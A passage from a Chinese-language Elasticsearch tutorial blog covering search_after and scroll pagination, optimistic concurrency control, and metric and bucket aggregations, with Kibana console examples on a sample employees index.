src="/images/big-data/es-06/14.jpg" alt="14"></p><h3 id="Search-After-避免深度分页的问题"><a href="#Search-After-避免深度分页的问题" class="headerlink" title="Search After 避免深度分页的问题"></a>Search After 避免深度分页的问题</h3><ul><li>避免深度分页的性能问题，可以实时获取下一页文档信息<ul><li>不支持指定页数（From）</li><li>不能往下翻</li></ul></li><li>第一步搜索需要指定 sort，并且保证值是唯一的（可以通过加入_id 保证唯一性）</li><li>然后使用上一次，最后一个文档的 sort 值进行查询</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">DELETE users</span><br><span class="line"></span><br><span class="line">POST users/_doc</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"user1"</span>,<span class="attr">"age"</span>:<span class="number">10</span>&#125;</span><br><span class="line"></span><br><span class="line">POST users/_doc</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"user2"</span>,<span class="attr">"age"</span>:<span class="number">11</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST users/_doc</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"user2"</span>,<span class="attr">"age"</span>:<span class="number">12</span>&#125;</span><br><span class="line"></span><br><span class="line">POST users/_doc</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"user2"</span>,<span class="attr">"age"</span>:<span class="number">13</span>&#125;</span><br><span class="line"></span><br><span class="line">POST users/_count</span><br><span class="line"></span><br><span class="line">POST users/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"query"</span>: &#123;</span><br><span class="line">        <span class="attr">"match_all"</span>: &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"sort"</span>: [</span><br><span class="line">        &#123;<span class="attr">"age"</span>: <span class="string">"desc"</span>&#125; ,</span><br><span class="line">        &#123;<span class="attr">"_id"</span>: <span class="string">"asc"</span>&#125;    </span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST users/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"query"</span>: &#123;</span><br><span class="line">        <span class="attr">"match_all"</span>: &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"search_after"</span>:</span><br><span class="line">        [</span><br><span class="line">          <span class="number">10</span>,</span><br><span class="line">          <span class="string">"ZQ0vYGsBrR8X3IP75QqX"</span>],</span><br><span class="line">    <span class="attr">"sort"</span>: [</span><br><span class="line">        &#123;<span class="attr">"age"</span>: <span class="string">"desc"</span>&#125; ,</span><br><span class="line">        &#123;<span class="attr">"_id"</span>: <span class="string">"asc"</span>&#125;    </span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Search-After-是如何解决深度分页的问题"><a href="#Search-After-是如何解决深度分页的问题" class="headerlink" title="Search After 是如何解决深度分页的问题"></a>Search After 是如何解决深度分页的问题</h3><ul><li>假设 Size 是 10</li><li>当查询 990 - 1000</li><li>通过唯一排序值定位，将每次要处理的文档都控制在 10</li></ul><p><img src="/images/big-data/es-06/15.jpg" alt="15"></p><h3 id="Scoll-API"><a href="#Scoll-API" class="headerlink" title="Scoll API"></a>Scoll API</h3><ul><li>创建一个快照，有新的数据写入以后，无法被查找</li><li>每次查询后，输入上一次的 Sroll ID</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">DELETE users</span><br><span class="line">POST users/_doc</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"user1"</span>,<span class="attr">"age"</span>:<span class="number">10</span>&#125;</span><br><span class="line"></span><br><span class="line">POST users/_doc</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"user2"</span>,<span class="attr">"age"</span>:<span class="number">20</span>&#125;</span><br><span class="line"></span><br><span class="line">POST users/_doc</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"user3"</span>,<span class="attr">"age"</span>:<span class="number">30</span>&#125;</span><br><span class="line"></span><br><span class="line">POST users/_doc</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"user4"</span>,<span class="attr">"age"</span>:<span class="number">40</span>&#125;</span><br><span class="line"></span><br><span class="line">POST /users/_search?scroll=5m</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"query"</span>: &#123;</span><br><span class="line">        <span class="attr">"match_all"</span> : &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST users/_doc</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"user5"</span>,<span class="attr">"age"</span>:<span class="number">50</span>&#125;</span><br><span class="line">POST /_search/scroll</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"scroll"</span> : <span class="string">"1m"</span>,</span><br><span class="line">    <span class="attr">"scroll_id"</span> : <span class="string">"DXF1ZXJ5QW5kRmV0Y2gBAAAAAAAAAWAWbWdoQXR2d3ZUd2kzSThwVTh4bVE0QQ=="</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="不同的搜索类型和使用场景"><a href="#不同的搜索类型和使用场景" class="headerlink" title="不同的搜索类型和使用场景"></a>不同的搜索类型和使用场景</h3><ul><li>Regular<ul><li>需要实时获取顶部的部分文档。例如查询最新的订单</li></ul></li><li>Scorll<ul><li>需要全部文档，例如导出全部数据</li></ul></li><li>Pagination<ul><li>From 和 Size</li></ul></li><li>如何需要深度分页，则选用 Search After</li></ul><h2 id="处理并发读写操作"><a href="#处理并发读写操作" class="headerlink" title="处理并发读写操作"></a>处理并发读写操作</h2><h3 id="并发控制的必要性"><a href="#并发控制的必要性" class="headerlink" title="并发控制的必要性"></a>并发控制的必要性</h3><ul><li>两个 Web 程序同时更新某个文档，如果缺乏有效的并发，会导致更改的数据丢失</li><li>悲观并发控制<ul><li>假定有变更冲突的可能，会对资源加锁，防止冲突。例如数据库行锁</li></ul></li><li>乐观并发控制<ul><li>假设突然是不会发生的，不会阻塞正在尝试的操作。如果数据在读写中被修改，更新将会失败。应用程序决定如何解决冲突，例如重试更新，使用新的数据，或者将错误报告给用户</li></ul></li><li>ES 采用的乐观并发控制</li></ul><p><img src="/images/big-data/es-06/16.jpg" alt="16"></p><h3 id="ES-的乐观并发控制"><a href="#ES-的乐观并发控制" class="headerlink" title="ES 的乐观并发控制"></a>ES 的乐观并发控制</h3><ul><li>ES 中的文档是不可变更的。如果你更新一个文档，会将会文档标记为删除，同时增加一个全新当文档，同时文档的 version 字段加 1</li><li>内部版本控制<ul><li>If_seq_no + If_primary_term</li></ul></li><li>使用外部版本（使用其他数据库作为主要数据存储）<ul><li>version + version_type = external</li></ul></li></ul><p><img src="/images/big-data/es-06/17.jpg" alt="17"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DELETE products</span><br><span class="line">PUT products</span><br><span class="line">PUT products/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"iphone"</span>,</span><br><span class="line">  <span class="attr">"count"</span>:<span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line">GET products/_doc/1</span><br><span class="line"><span class="comment">//只能执行一次</span></span><br><span class="line">PUT products/_doc/1?if_seq_no=0&amp;if_primary_term=1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"iphone"</span>,</span><br><span class="line">  <span class="attr">"count"</span>:<span class="number">110</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//数据库版本号为主</span></span><br><span class="line">PUT products/_doc/1?version=23&amp;version_type=external</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"iphone"</span>,</span><br><span class="line">  <span class="attr">"count"</span>:<span class="number">130</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Bucket-amp-Metric-聚合分析及嵌套聚合"><a href="#Bucket-amp-Metric-聚合分析及嵌套聚合" class="headerlink" title="Bucket &amp; Metric 聚合分析及嵌套聚合"></a>Bucket &amp; Metric 聚合分析及嵌套聚合</h2><h3 id="Bucket-amp-Metric-Aggregation"><a href="#Bucket-amp-Metric-Aggregation" class="headerlink" title="Bucket &amp; Metric Aggregation"></a>Bucket &amp; Metric Aggregation</h3><ul><li>Metric 一些系列的统计方法</li><li>Bucket 一组满足条件的文档</li></ul><p><img src="/images/big-data/es-06/18.jpg" alt="18"></p><h3 id="Aggregation-的语法"><a href="#Aggregation-的语法" class="headerlink" title="Aggregation 的语法"></a>Aggregation 的语法</h3><p>Aggregation 属于 Search 的一部分。一般情况下，建议将其 Size 指定为 0</p><p><img src="/images/big-data/es-06/19.jpg" alt="19"></p><p><strong>例子: 工资统计信息</strong></p><p><img src="/images/big-data/es-06/20.jpg" alt="20"></p><h3 id="Mertric-Aggregation"><a href="#Mertric-Aggregation" class="headerlink" title="Mertric Aggregation"></a>Mertric Aggregation</h3><ul><li>单值分析：只输出一个分析结果<ul><li>min，max，avg，sum</li><li>Cardinality（类似 distinct Count）</li></ul></li><li>多值分析：输出多个分析结果<ul><li>stats, extended stats</li><li>percentile, percentile rank</li><li>top hits （排在前面的示例）</li></ul></li></ul><h3 id="Metric-聚合的具体-Demo"><a href="#Metric-聚合的具体-Demo" class="headerlink" title="Metric 聚合的具体 Demo"></a>Metric 聚合的具体 Demo</h3><ul><li>查看最低工资</li><li>查看最高工资</li><li>一个聚合输出多个值</li><li>一次查询包含多个聚合<ul><li>同时查看最低, 最高和平均工资</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">DELETE /employees</span><br><span class="line">PUT /employees/</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">      <span class="attr">"properties"</span> : &#123;</span><br><span class="line">        <span class="attr">"age"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"integer"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"gender"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"job"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">              <span class="attr">"ignore_above"</span> : <span class="number">50</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"name"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"salary"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"integer"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT /employees/_bulk</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"1"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Emma"</span>,<span class="attr">"age"</span>:<span class="number">32</span>,<span class="attr">"job"</span>:<span class="string">"Product Manager"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>:<span class="number">35000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"2"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Underwood"</span>,<span class="attr">"age"</span>:<span class="number">41</span>,<span class="attr">"job"</span>:<span class="string">"Dev Manager"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">50000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"3"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Tran"</span>,<span class="attr">"age"</span>:<span class="number">25</span>,<span class="attr">"job"</span>:<span class="string">"Web Designer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>:<span class="number">18000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"4"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Rivera"</span>,<span class="attr">"age"</span>:<span class="number">26</span>,<span class="attr">"job"</span>:<span class="string">"Web Designer"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>: <span class="number">22000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"5"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Rose"</span>,<span class="attr">"age"</span>:<span class="number">25</span>,<span class="attr">"job"</span>:<span class="string">"QA"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>:<span class="number">18000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"6"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Lucy"</span>,<span class="attr">"age"</span>:<span class="number">31</span>,<span class="attr">"job"</span>:<span class="string">"QA"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>: <span class="number">25000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"7"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Byrd"</span>,<span class="attr">"age"</span>:<span class="number">27</span>,<span class="attr">"job"</span>:<span class="string">"QA"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>:<span class="number">20000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"8"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Foster"</span>,<span class="attr">"age"</span>:<span class="number">27</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">20000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"9"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Gregory"</span>,<span class="attr">"age"</span>:<span class="number">32</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>:<span class="number">22000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"10"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Bryant"</span>,<span class="attr">"age"</span>:<span class="number">20</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">9000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"11"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Jenny"</span>,<span class="attr">"age"</span>:<span class="number">36</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>:<span class="number">38000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"12"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Mcdonald"</span>,<span class="attr">"age"</span>:<span class="number">31</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">32000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"13"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Jonthna"</span>,<span class="attr">"age"</span>:<span class="number">30</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>:<span class="number">30000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"14"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Marshall"</span>,<span class="attr">"age"</span>:<span class="number">32</span>,<span class="attr">"job"</span>:<span class="string">"Javascript Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">25000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"15"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"King"</span>,<span class="attr">"age"</span>:<span class="number">33</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>:<span class="number">28000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"16"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Mccarthy"</span>,<span class="attr">"age"</span>:<span class="number">21</span>,<span class="attr">"job"</span>:<span class="string">"Javascript Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">16000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"17"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Goodwin"</span>,<span class="attr">"age"</span>:<span class="number">25</span>,<span class="attr">"job"</span>:<span class="string">"Javascript Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">16000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"18"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Catherine"</span>,<span class="attr">"age"</span>:<span class="number">29</span>,<span class="attr">"job"</span>:<span class="string">"Javascript Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>: <span class="number">20000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"19"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Boone"</span>,<span class="attr">"age"</span>:<span class="number">30</span>,<span class="attr">"job"</span>:<span class="string">"DBA"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">30000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"20"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Kathy"</span>,<span class="attr">"age"</span>:<span class="number">29</span>,<span class="attr">"job"</span>:<span class="string">"DBA"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>: <span class="number">20000</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Metric 聚合，找到最低的工资</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"min_salary"</span>: &#123;</span><br><span class="line">      <span class="attr">"min"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Metric 聚合，找到最高的工资</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"max_salary"</span>: &#123;</span><br><span class="line">      <span class="attr">"max"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个 Metric 聚合，找到最低最高和平均工资</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"max_salary"</span>: &#123;</span><br><span class="line">      <span class="attr">"max"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"min_salary"</span>: &#123;</span><br><span class="line">      <span class="attr">"min"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"avg_salary"</span>: &#123;</span><br><span class="line">      <span class="attr">"avg"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个聚合，输出多值</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"stats_salary"</span>: &#123;</span><br><span class="line">      <span class="attr">"stats"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Bucket"><a href="#Bucket" class="headerlink" title="Bucket"></a>Bucket</h3><ul><li>按照一定的规则，将文档分配到不同的桶中，从而达到分类的目的。ES 提供的一些常见的 Bucket Aggregation<ul><li>Terms</li><li>数字类型</li><li>Range / Date Range</li><li>Histogram / Data Histogram</li></ul></li><li>支持嵌套：也就在桶里在做分桶</li></ul><p><img src="/images/big-data/es-06/21.jpg" alt="21"></p><h3 id="Terms-Aggregation"><a href="#Terms-Aggregation" class="headerlink" title="Terms Aggregation"></a>Terms Aggregation</h3><ul><li>字段需要打开 fielddata，才能进行 Terms Aggregation<ul><li>Keyword 默认支持 doc_values</li><li>Text 需要在 Mapping 中 enable ，会按照分词后的结果进行分</li></ul></li><li>Demo<ul><li>对 job 和 job.keyword 进行聚合</li><li>对性别进行 Terms 聚合</li><li>指定 bucket size</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 